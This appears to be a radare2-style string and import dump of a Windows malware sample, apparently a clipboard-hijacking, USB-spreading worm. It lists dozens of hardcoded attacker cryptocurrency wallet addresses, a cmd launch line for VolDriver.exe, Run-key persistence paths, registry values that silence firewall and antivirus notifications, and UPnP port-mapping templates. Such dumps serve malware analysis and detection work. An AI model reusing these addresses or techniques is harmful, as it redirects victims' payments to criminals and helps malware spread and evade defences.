Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0xde00 0x00401000  0xe000 -r-x .text
1   0x0000e200  0x2e00 0x0040f000  0x3000 -r-- .rdata
2   0x00011000  0x1000 0x00412000  0x3000 -rw- .data

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x004059a0 paddr=0x00004da0 haddr=0x00000110 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
14  0x0000e3b8 0x0040f1b8 NONE FUNC 0    USER32.dll   imp.wsprintfA
15  0x0000e3bc 0x0040f1bc NONE FUNC 0    USER32.dll   imp.wvsprintfA
16  0x0000e3c0 0x0040f1c0 NONE FUNC 0    USER32.dll   imp.GetWindowLongW
17  0x0000e3c4 0x0040f1c4 NONE FUNC 0    USER32.dll   imp.CreateWindowExW
18  0x0000e3c8 0x0040f1c8 NONE FUNC 0    USER32.dll   imp.DispatchMessageA
19  0x0000e3cc 0x0040f1cc NONE FUNC 0    USER32.dll   imp.OpenClipboard
20  0x0000e3d0 0x0040f1d0 NONE FUNC 0    USER32.dll   imp.SetClipboardData
21  0x0000e3d4 0x0040f1d4 NONE FUNC 0    USER32.dll   imp.SetClipboardViewer
1   0x0000e200 0x0040f000 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExW
2   0x0000e204 0x0040f004 NONE FUNC 0    ADVAPI32.dll imp.CryptGenRandom
3   0x0000e208 0x0040f008 NONE FUNC 0    ADVAPI32.dll imp.CryptReleaseContext
4   0x0000e20c 0x0040f00c NONE FUNC 0    ADVAPI32.dll imp.CryptAcquireContextW
5   0x0000e210 0x0040f010 NONE FUNC 0    ADVAPI32.dll imp.RegQueryValueExW
6   0x0000e214 0x0040f014 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExA
7   0x0000e218 0x0040f018 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExA
8   0x0000e21c 0x0040f01c NONE FUNC 0    ADVAPI32.dll imp.RegCloseKey
9   0x0000e220 0x0040f020 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExW
1   0x0000e358 0x0040f158 NONE FUNC 0    SHELL32.dll  imp.ShellExecuteW
1   0x0000e4dc 0x0040f2dc NONE FUNC 0    ole32.dll    imp.CoInitializeEx
2   0x0000e4e0 0x0040f2e0 NONE FUNC 0    ole32.dll    imp.CoCreateInstance
3   0x0000e4e4 0x0040f2e4 NONE FUNC 0    ole32.dll    imp.CoInitialize
4   0x0000e4e8 0x0040f2e8 NONE FUNC 0    ole32.dll    imp.CoUninitialize
2   0x0000e34c 0x0040f14c NONE FUNC 0    OLEAUT32.dll imp.SysReAllocString
6   0x0000e350 0x0040f150 NONE FUNC 0    OLEAUT32.dll imp.SysStringLen
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000e4fa 0x0040f2fa 4   5    .rdata  ascii   3)6{
1   0x0000e547 0x0040f347 4   5    .rdata  ascii   FUKR
2   0x0000e54c 0x0040f34c 4   10   .rdata  utf16le open
3   0x0000e558 0x0040f358 114 115  .rdata  ascii   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
4   0x0000e5cc 0x0040f3cc 6   14   .rdata  utf16le %temp%
5   0x0000e5dc 0x0040f3dc 11  24   .rdata  utf16le %s\%d%d.exe
6   0x0000e5f6 0x0040f3f6 115 232  .rdata  utf16le TMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
7   0x0000e6e0 0x0040f4e0 18  38   .rdata  utf16le %s:Zone.Identifier
8   0x0000e708 0x0040f508 11  24   .rdata  utf16le %s\%d%d.exe
9   0x0000e720 0x0040f520 18  38   .rdata  utf16le %s:Zone.Identifier
10  0x0000e748 0x0040f548 15  16   .rdata  ascii   HTTP/1.1 200 OK
11  0x0000e758 0x0040f558 10  11   .rdata  ascii   LOCATION: 
12  0x0000e764 0x0040f564 15  16   .rdata  ascii   239.255.255.250
13  0x0000e774 0x0040f574 4   10   .rdata  utf16le Body
14  0x0000e780 0x0040f580 135 136  .rdata  ascii   M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
15  0x0000e808 0x0040f608 7   16   .rdata  utf16le service
16  0x0000e818 0x0040f618 11  24   .rdata  utf16le serviceType
17  0x0000e830 0x0040f630 11  24   .rdata  utf16le serviceList
18  0x0000e848 0x0040f648 6   14   .rdata  utf16le device
19  0x0000e858 0x0040f658 10  22   .rdata  utf16le deviceType
20  0x0000e870 0x0040f670 10  22   .rdata  utf16le deviceList
21  0x0000e888 0x0040f688 51  104  .rdata  utf16le urn:schemas-upnp-org:device:InternetGatewayDevice:1
22  0x0000e8f0 0x0040f6f0 39  80   .rdata  utf16le urn:schemas-upnp-org:device:WANDevice:1
23  0x0000e940 0x0040f740 49  100  .rdata  utf16le urn:schemas-upnp-org:device:WANConnectionDevice:1
24  0x0000e9a4 0x0040f7a4 28  58   .rdata  utf16le GetExternalIPAddressResponse
25  0x0000e9e0 0x0040f7e0 46  94   .rdata  utf16le urn:schemas-upnp-org:service:WANIPConnection:1
26  0x0000ea40 0x0040f840 47  96   .rdata  utf16le urn:schemas-upnp-org:service:WANPPPConnection:1
27  0x0000eaa0 0x0040f8a0 10  22   .rdata  utf16le controlURL
28  0x0000eab8 0x0040f8b8 7   16   .rdata  utf16le URLBase
29  0x0000eac8 0x0040f8c8 4   5    .rdata  ascii   %S%S
30  0x0000ead0 0x0040f8d0 46  47   .rdata  ascii   Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
31  0x0000eb00 0x0040f900 4   5    .rdata  ascii   POST
32  0x0000eb08 0x0040f908 103 104  .rdata  ascii   Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
33  0x0000eb70 0x0040f970 303 304  .rdata  ascii   <?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:GetExternalIPAddress xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"/></SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n
34  0x0000eca0 0x0040faa0 81  82   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"
35  0x0000ecf4 0x0040faf4 20  42   .rdata  utf16le NewExternalIPAddress
36  0x0000ed20 0x0040fb20 641 642  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
37  0x0000efa8 0x0040fda8 75  76   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
38  0x0000eff8 0x0040fdf8 442 443  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:DeletePortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost>%s</NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n</m:DeletePortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
39  0x0000f1b8 0x0040ffb8 78  79   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"
40  0x0000f214 0x00410014 37  38   .rdata  ascii   TCP: P2P_SendGETLPacket(0,%s) failed!
41  0x0000f23c 0x0041003c 6   7    .rdata  ascii   twizt)
42  0x0000f244 0x00410044 6   7    .rdata  ascii   twizt)
43  0x0000f24c 0x0041004c 6   7    .rdata  ascii   twizt)
44  0x0000f254 0x00410054 6   7    .rdata  ascii   twizt)
45  0x0000f25c 0x0041005c 24  25   .rdata  ascii   www.update.microsoft.com
46  0x0000f281 0x00410081 8   11   .rdata  utf8    Ȫ4d(2dwh blocks=Latin Extended-B,Basic Latin
47  0x0000f2b7 0x004100b7 5   6    .rdata  ascii   T1`m\n
48  0x0000f2bf 0x004100bf 4   5    .rdata  ascii   J\r."
49  0x0000f2eb 0x004100eb 5   6    .rdata  ascii   c"5o\r
50  0x0000f2ff 0x004100ff 7   8    .rdata  ascii   salpha_
51  0x0000f308 0x00410108 5   6    .rdata  ascii   beta_
52  0x0000f310 0x00410110 6   7    .rdata  ascii   gamma_
53  0x0000f318 0x00410118 6   7    .rdata  ascii   delta_
54  0x0000f320 0x00410120 8   9    .rdata  ascii   epsilon_
55  0x0000f32c 0x0041012c 5   6    .rdata  ascii   zeta_
56  0x0000f334 0x00410134 4   5    .rdata  ascii   %s%s
57  0x0000f33c 0x0041013c 18  38   .rdata  utf16le %s:Zone.Identifier
58  0x0000f364 0x00410164 13  28   .rdata  utf16le %userprofile%
59  0x0000f380 0x00410180 8   18   .rdata  utf16le %windir%
60  0x0000f394 0x00410194 5   12   .rdata  utf16le %s\%s
61  0x0000f3a0 0x004101a0 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
62  0x0000f400 0x00410200 5   12   .rdata  utf16le %s\%s
63  0x0000f40c 0x0041020c 34  35   .rdata  ascii   SOFTWARE\Microsoft\Security Center
64  0x0000f430 0x00410230 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
65  0x0000f490 0x00410290 16  17   .rdata  ascii   FirewallOverride
66  0x0000f4a4 0x004102a4 21  22   .rdata  ascii   FirewallDisableNotify
67  0x0000f4bc 0x004102bc 19  20   .rdata  ascii   AntiSpywareOverride
68  0x0000f4d0 0x004102d0 17  18   .rdata  ascii   AntiVirusOverride
69  0x0000f4e4 0x004102e4 22  23   .rdata  ascii   AntiVirusDisableNotify
70  0x0000f4fc 0x004102fc 15  16   .rdata  ascii   UpdatesOverride
71  0x0000f50c 0x0041030c 20  21   .rdata  ascii   UpdatesDisableNotify
72  0x0000f524 0x00410324 38  39   .rdata  ascii   SOFTWARE\Microsoft\Security Center\Svc
73  0x0000f54c 0x0041034c 16  17   .rdata  ascii   FirewallOverride
74  0x0000f560 0x00410360 21  22   .rdata  ascii   FirewallDisableNotify
75  0x0000f578 0x00410378 19  20   .rdata  ascii   AntiSpywareOverride
76  0x0000f58c 0x0041038c 17  18   .rdata  ascii   AntiVirusOverride
77  0x0000f5a0 0x004103a0 22  23   .rdata  ascii   AntiVirusDisableNotify
78  0x0000f5b8 0x004103b8 15  16   .rdata  ascii   UpdatesOverride
79  0x0000f5c8 0x004103c8 20  21   .rdata  ascii   UpdatesDisableNotify
80  0x0000f5e0 0x004103e0 16  34   .rdata  utf16le %s\nodesinfo.dat
81  0x0000f604 0x00410404 14  30   .rdata  utf16le %s\cmdinfo.dat
82  0x0000f624 0x00410424 21  44   .rdata  utf16le Microsoft Corporation
83  0x0000f650 0x00410450 4   10   .rdata  utf16le \??\
84  0x0000f660 0x00410460 59  120  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
85  0x0000f6d8 0x004104d8 8   18   .rdata  utf16le NoDrives
86  0x0000f6f0 0x004104f0 40  82   .rdata  utf16le /c start .\%s & start .\%s\VolDriver.exe
87  0x0000f744 0x00410544 25  52   .rdata  utf16le %windir%\system32\cmd.exe
88  0x0000f778 0x00410578 4   10   .rdata  utf16le %s\*
89  0x0000f790 0x00410590 5   12   .rdata  utf16le %s\%s
90  0x0000f79c 0x0041059c 5   12   .rdata  utf16le %s\%s
91  0x0000f7a8 0x004105a8 6   14   .rdata  utf16le %s.lnk
92  0x0000f7b8 0x004105b8 5   12   .rdata  utf16le %s\%s
93  0x0000f7c4 0x004105c4 19  40   .rdata  utf16le %s\%s\VolDriver.exe
94  0x0000f7ec 0x004105ec 5   12   .rdata  utf16le %s\%s
95  0x0000f7f8 0x004105f8 4   10   .rdata  utf16le %s\*
96  0x0000f804 0x00410604 11  24   .rdata  utf16le shell32.dll
97  0x0000f81c 0x0041061c 11  24   .rdata  utf16le shell32.dll
98  0x0000f834 0x00410634 5   12   .rdata  utf16le *.lnk
99  0x0000f840 0x00410640 5   12   .rdata  utf16le *.vbs
100 0x0000f84c 0x0041064c 4   10   .rdata  utf16le *.js
101 0x0000f858 0x00410658 5   12   .rdata  utf16le *.inf
102 0x0000f864 0x00410664 5   12   .rdata  utf16le *.scr
103 0x0000f870 0x00410670 5   12   .rdata  utf16le *.com
104 0x0000f87c 0x0041067c 5   12   .rdata  utf16le *.jse
105 0x0000f888 0x00410688 5   12   .rdata  utf16le *.cmd
106 0x0000f894 0x00410694 5   12   .rdata  utf16le *.pif
107 0x0000f8a0 0x004106a0 5   12   .rdata  utf16le *.jar
108 0x0000f8ac 0x004106ac 5   12   .rdata  utf16le *.dll
109 0x0000f8b8 0x004106b8 5   12   .rdata  utf16le *.vbe
110 0x0000f8c4 0x004106c4 5   12   .rdata  utf16le *.bat
111 0x0000f8d0 0x004106d0 9   20   .rdata  utf16le Thumbs.db
112 0x0000f8e4 0x004106e4 12  26   .rdata  utf16le $RECYCLE.BIN
113 0x0000f900 0x00410700 11  24   .rdata  utf16le desktop.ini
114 0x0000f918 0x00410718 25  52   .rdata  utf16le System Volume Information
115 0x0000f958 0x00410758 5   12   .rdata  utf16le %s\%s
116 0x0000f964 0x00410764 5   12   .rdata  utf16le %s\%s
117 0x0000f970 0x00410770 8   18   .rdata  utf16le %s\%s\%s
118 0x0000f984 0x00410784 7   16   .rdata  utf16le  (%dGB)
119 0x0000f994 0x00410794 14  30   .rdata  utf16le Unnamed volume
120 0x0000f9b4 0x004107b4 4   10   .rdata  utf16le %s%s
121 0x0000f9c0 0x004107c0 12  26   .rdata  utf16le bitcoincash:
122 0x0000f9dc 0x004107dc 6   14   .rdata  utf16le cosmos
123 0x0000f9ec 0x004107ec 4   10   .rdata  utf16le addr
124 0x0000f9f8 0x004107f8 12  26   .rdata  utf16le bitcoincash:
125 0x0000fa14 0x00410814 21  22   .rdata  ascii   14673222387840093601L
126 0x0000fa2c 0x0041082c 48  49   .rdata  ascii   12gcwY6q4pv4DBbEjeQXwbhDBesLDc755VE2kyzzXRtvBvzd
127 0x0000fa60 0x00410860 34  35   .rdata  ascii   18xjALsLW57DQcXSgvGE8H9iXkXYvPjSWc
128 0x0000fa84 0x00410884 35  36   .rdata  ascii   3PLk48rqFRT7ZB2GZVHMJE5aiHr5jjBfZcw
129 0x0000faa8 0x004108a8 34  35   .rdata  ascii   39t2ndtRZKxHPHaprbe6kPaws4vs1nWA94
130 0x0000facc 0x004108cc 42  43   .rdata  ascii   qz9vrpv9h2j5e6fsqwwsh8e9aaumwvql956ynh9rs9
131 0x0000faf8 0x004108f8 34  35   .rdata  ascii   XmgkLqGXu8HGU7tTbbwWvaJYrgvybx3eZE
132 0x0000fb1c 0x0041091c 34  35   .rdata  ascii   DSVC6eMqTCpkaMkCVp6Yn2U7FYkU76VhKB
133 0x0000fb40 0x00410940 42  43   .rdata  ascii   0xd4F8DfD1cDBa76e9ac6b3b31Ef3C6C6c3D1ea1d0
134 0x0000fb6c 0x0041096c 34  35   .rdata  ascii   LXz2Jhi73bna54msz2zpsEpRVAh8KbeYRL
135 0x0000fb90 0x00410990 34  35   .rdata  ascii   rPTusqR9SMoh7QuYfJ3EJF7Ewogp6HVJEt
136 0x0000fbb4 0x004109b4 34  35   .rdata  ascii   TCW3T7UyyN3MWqakTPViWVRAL1kGsYyTL6
137 0x0000fbd8 0x004109d8 35  36   .rdata  ascii   t1gE3Hz4ivvEAQMWagv5XuUMkUPcnNkuNGB
138 0x0000fbfc 0x004109fc 36  37   .rdata  ascii   tz1U9d1x7U3AEMw8UPSVMtEH4u9eShBX6prG
139 0x0000fc24 0x00410a24 42  43   .rdata  ascii   hxd697fe63e8c4d138cd47d9cdbff6bbf6facbd1fb
140 0x0000fc50 0x00410a50 34  35   .rdata  ascii   QQeW6TaSKUA9yuG2mPKMd6epoXa6vnRqh6
141 0x0000fc74 0x00410a74 34  35   .rdata  ascii   RRqRTmr9WDk2LdTn7mfMHXofz1XaoTrG3C
142 0x0000fc98 0x00410a98 40  41   .rdata  ascii   NBGLRULGKDFPLIDQZRDQOORKONAV5VRWOV3CDGJW
143 0x0000fcc4 0x00410ac4 34  35   .rdata  ascii   AUpwoQdnjVynLKhDkNt1TJh6sgduJnxyJy
144 0x0000fce8 0x00410ae8 34  35   .rdata  ascii   SNjNq8EbkPcfEqQtE6FTM5eftqS33otZY4
145 0x0000fd0c 0x00410b0c 42  43   .rdata  ascii   zil1afs50sm4fe7ulsdygvvl7x6tygtcwmkrqtzqlq
146 0x0000fd38 0x00410b38 35  36   .rdata  ascii   s1iibbBPLCP843XGjxRxoT9Skk542HMLU5v
147 0x0000fd5c 0x00410b5c 11  24   .rdata  utf16le bitcoincash
148 0x0000fd74 0x00410b74 54  55   .rdata  ascii   bitcoincash:qz9vrpv9h2j5e6fsqwwsh8e9aaumwvql956ynh9rs9
149 0x0000fdac 0x00410bac 6   14   .rdata  utf16le cosmos
150 0x0000fdbc 0x00410bbc 45  46   .rdata  ascii   cosmos1j2j4n8mn2al28g62uzsrf9jhhqjsdpr58et5j4
151 0x0000fdf0 0x00410bf0 95  96   .rdata  ascii   46wi3NQz8eWV9HnGGKtpqKFcyGqWvLXsRP9C4oh3FgJ8M11QzmSrWWu6hW2kdredmQDYFjkJNg8t4Lye6vPuRcCsK71DPYr
152 0x0000fe50 0x00410c50 4   10   .rdata  utf16le addr
153 0x0000fe60 0x00410c60 103 104  .rdata  ascii   addr1qx6957p39d7v53mvqe7gqc62eazsmmxhlth870590x9v8mq0pjv9yx5jd4sgndnt87zmdutq87r8xh0m8pn65k2p9yasl4vamq
154 0x0000fec8 0x00410cc8 34  35   .rdata  ascii   Fd8ScFbi4ZnkrDYZa2Fhanx3BuoWXFzDaG
155 0x0000feec 0x00410cec 56  57   .rdata  ascii   GAWB6FUMRQBOF4JSVWAH6GO26C24UL5P44G3LDWK46WMFAS2TAZD7EBC
156 0x0000ff28 0x00410d28 34  35   .rdata  ascii   GLnwYTx21SBA1XAsBqtFumkDMpB97tmqsp
157 0x0000ff54 0x00410d54 42  43   .rdata  ascii   bnb1yzw7m55vrhqmmw2e0xpven8q49u8m63prv3hhz
158 0x0000ff80 0x00410d80 4   10   .rdata  utf16le band
159 0x0000ff8c 0x00410d8c 43  44   .rdata  ascii   band1ecl9c2w2dtxx70pewvsl6le3sd8srrlg36vthx
160 0x0000ffc0 0x00410dc0 42  43   .rdata  ascii   bc1q4eym03072yk0zahdm9jym28vk0dxwyvs57sr6g
161 0x0000ffec 0x00410dec 9   10   .rdata  ascii   U30212907
162 0x0000fff8 0x00410df8 9   10   .rdata  ascii   E30940134
163 0x00010004 0x00410e04 9   10   .rdata  ascii   B30912949
164 0x00010010 0x00410e10 4   10   .rdata  utf16le %x%X
165 0x0001001e 0x00410e1e 4   5    .rdata  ascii   L09n
166 0x00010040 0x00410e40 4   5    .rdata  ascii   b'kJ
167 0x000104a8 0x004112a8 10  11   .rdata  ascii   WS2_32.dll
168 0x000104b6 0x004112b6 7   8    .rdata  ascii   StrStrW
169 0x000104c0 0x004112c0 15  16   .rdata  ascii   PathFileExistsW
170 0x000104d2 0x004112d2 8   9    .rdata  ascii   StrCmpNW
171 0x000104de 0x004112de 14  15   .rdata  ascii   PathMatchSpecW
172 0x000104f0 0x004112f0 17  18   .rdata  ascii   PathFindFileNameW
173 0x00010504 0x00411304 7   8    .rdata  ascii   StrChrA
174 0x0001050e 0x0041130e 8   9    .rdata  ascii   StrStrIA
175 0x0001051a 0x0041131a 9   10   .rdata  ascii   StrCmpNIA
176 0x00010524 0x00411324 11  12   .rdata  ascii   SHLWAPI.dll
177 0x00010532 0x00411332 18  19   .rdata  ascii   URLDownloadToFileW
178 0x00010546 0x00411346 10  11   .rdata  ascii   urlmon.dll
179 0x00010554 0x00411354 16  17   .rdata  ascii   InternetConnectA
180 0x00010568 0x00411368 17  18   .rdata  ascii   InternetCrackUrlA
181 0x0001057c 0x0041137c 16  17   .rdata  ascii   InternetReadFile
182 0x00010590 0x00411390 16  17   .rdata  ascii   HttpOpenRequestA
183 0x000105a4 0x004113a4 22  23   .rdata  ascii   HttpAddRequestHeadersA
184 0x000105be 0x004113be 16  17   .rdata  ascii   HttpSendRequestA
185 0x000105d2 0x004113d2 13  14   .rdata  ascii   InternetOpenA
186 0x000105e2 0x004113e2 19  20   .rdata  ascii   InternetCloseHandle
187 0x000105f8 0x004113f8 13  14   .rdata  ascii   InternetOpenW
188 0x00010608 0x00411408 14  15   .rdata  ascii   HttpQueryInfoA
189 0x0001061a 0x0041141a 16  17   .rdata  ascii   InternetOpenUrlA
190 0x0001062e 0x0041142e 16  17   .rdata  ascii   InternetOpenUrlW
191 0x00010640 0x00411440 11  12   .rdata  ascii   WININET.dll
192 0x0001064e 0x0041144e 7   8    .rdata  ascii   isalpha
193 0x00010658 0x00411458 7   8    .rdata  ascii   isdigit
194 0x00010662 0x00411462 7   8    .rdata  ascii   memmove
195 0x0001066c 0x0041146c 17  18   .rdata  ascii   NtQuerySystemTime
196 0x00010680 0x00411480 25  26   .rdata  ascii   RtlTimeToSecondsSince1980
197 0x0001069c 0x0041149c 8   9    .rdata  ascii   mbstowcs
198 0x000106a6 0x004114a6 9   10   .rdata  ascii   ntdll.dll
199 0x000106b2 0x004114b2 10  11   .rdata  ascii   _vscprintf
200 0x000106c0 0x004114c0 4   5    .rdata  ascii   rand
201 0x000106c8 0x004114c8 5   6    .rdata  ascii   srand
202 0x000106ce 0x004114ce 10  11   .rdata  ascii   msvcrt.dll
203 0x000106dc 0x004114dc 8   9    .rdata  ascii   lstrlenA
204 0x000106e8 0x004114e8 10  11   .rdata  ascii   GlobalLock
205 0x000106f6 0x004114f6 16  17   .rdata  ascii   GetModuleHandleW
206 0x0001070a 0x0041150a 12  13   .rdata  ascii   GetTickCount
207 0x0001071a 0x0041151a 11  12   .rdata  ascii   GlobalAlloc
208 0x00010728 0x00411528 5   6    .rdata  ascii   Sleep
209 0x00010730 0x00411530 9   10   .rdata  ascii   lstrcpynW
210 0x0001073c 0x0041153c 10  11   .rdata  ascii   ExitThread
211 0x0001074a 0x0041154a 19  20   .rdata  ascii   MultiByteToWideChar
212 0x00010760 0x00411560 8   9    .rdata  ascii   lstrlenW
213 0x0001076c 0x0041156c 12  13   .rdata  ascii   GlobalUnlock
214 0x0001077c 0x0041157c 11  12   .rdata  ascii   GetFileSize
215 0x0001078a 0x0041158a 13  14   .rdata  ascii   MapViewOfFile
216 0x0001079a 0x0041159a 15  16   .rdata  ascii   UnmapViewOfFile
217 0x000107ac 0x004115ac 9   10   .rdata  ascii   WriteFile
218 0x000107b8 0x004115b8 25  26   .rdata  ascii   InitializeCriticalSection
219 0x000107d4 0x004115d4 20  21   .rdata  ascii   LeaveCriticalSection
220 0x000107ec 0x004115ec 11  12   .rdata  ascii   CreateFileW
221 0x000107fa 0x004115fa 16  17   .rdata  ascii   FlushFileBuffers
222 0x0001080e 0x0041160e 20  21   .rdata  ascii   EnterCriticalSection
223 0x00010826 0x00411626 18  19   .rdata  ascii   CreateFileMappingW
224 0x0001083c 0x0041163c 11  12   .rdata  ascii   CloseHandle
225 0x0001084a 0x0041164a 14  15   .rdata  ascii   FindFirstFileW
226 0x0001085c 0x0041165c 13  14   .rdata  ascii   GetDriveTypeW
227 0x0001086c 0x0041166c 11  12   .rdata  ascii   MoveFileExW
228 0x0001087a 0x0041167a 16  17   .rdata  ascii   CreateDirectoryW
229 0x0001088e 0x0041168e 16  17   .rdata  ascii   GetLogicalDrives
230 0x000108a2 0x004116a2 9   10   .rdata  ascii   CopyFileW
231 0x000108ae 0x004116ae 18  19   .rdata  ascii   GetModuleFileNameW
232 0x000108c4 0x004116c4 8   9    .rdata  ascii   lstrcmpW
233 0x000108d0 0x004116d0 9   10   .rdata  ascii   FindClose
234 0x000108dc 0x004116dc 16  17   .rdata  ascii   RemoveDirectoryW
235 0x000108f0 0x004116f0 15  16   .rdata  ascii   QueryDosDeviceW
236 0x00010902 0x00411702 9   10   .rdata  ascii   lstrcmpiW
237 0x0001090e 0x0041170e 13  14   .rdata  ascii   FindNextFileW
238 0x0001091e 0x0041171e 19  20   .rdata  ascii   GetDiskFreeSpaceExW
239 0x00010934 0x00411734 11  12   .rdata  ascii   DeleteFileW
240 0x00010942 0x00411742 8   9    .rdata  ascii   lstrcpyW
241 0x0001094e 0x0041174e 18  19   .rdata  ascii   SetFileAttributesW
242 0x00010964 0x00411764 21  22   .rdata  ascii   GetVolumeInformationW
243 0x0001097c 0x0041177c 11  12   .rdata  ascii   ExitProcess
244 0x0001098a 0x0041178a 12  13   .rdata  ascii   CreateEventA
245 0x0001099a 0x0041179a 12  13   .rdata  ascii   GetLastError
246 0x000109aa 0x004117aa 12  13   .rdata  ascii   CreateMutexA
247 0x000109ba 0x004117ba 12  13   .rdata  ascii   CreateThread
248 0x000109ca 0x004117ca 25  26   .rdata  ascii   ExpandEnvironmentStringsW
249 0x000109e6 0x004117e6 11  12   .rdata  ascii   HeapReAlloc
250 0x000109f4 0x004117f4 9   10   .rdata  ascii   HeapAlloc
251 0x00010a00 0x00411800 8   9    .rdata  ascii   HeapFree
252 0x00010a0c 0x0041180c 10  11   .rdata  ascii   HeapCreate
253 0x00010a1a 0x0041181a 12  13   .rdata  ascii   HeapValidate
254 0x00010a2a 0x0041182a 15  16   .rdata  ascii   GetProcessHeaps
255 0x00010a3c 0x0041183c 18  19   .rdata  ascii   HeapSetInformation
256 0x00010a52 0x00411852 19  20   .rdata  ascii   GetCurrentProcessId
257 0x00010a68 0x00411868 20  21   .rdata  ascii   InterlockedDecrement
258 0x00010a80 0x00411880 19  20   .rdata  ascii   WaitForSingleObject
259 0x00010a96 0x00411896 19  20   .rdata  ascii   InterlockedExchange
260 0x00010aac 0x004118ac 20  21   .rdata  ascii   InterlockedIncrement
261 0x00010ac4 0x004118c4 22  23   .rdata  ascii   InterlockedExchangeAdd
262 0x00010ade 0x004118de 17  18   .rdata  ascii   GetCurrentProcess
263 0x00010af2 0x004118f2 16  17   .rdata  ascii   GetCurrentThread
264 0x00010b06 0x00411906 17  18   .rdata  ascii   SetThreadPriority
265 0x00010b1a 0x0041191a 17  18   .rdata  ascii   GetThreadPriority
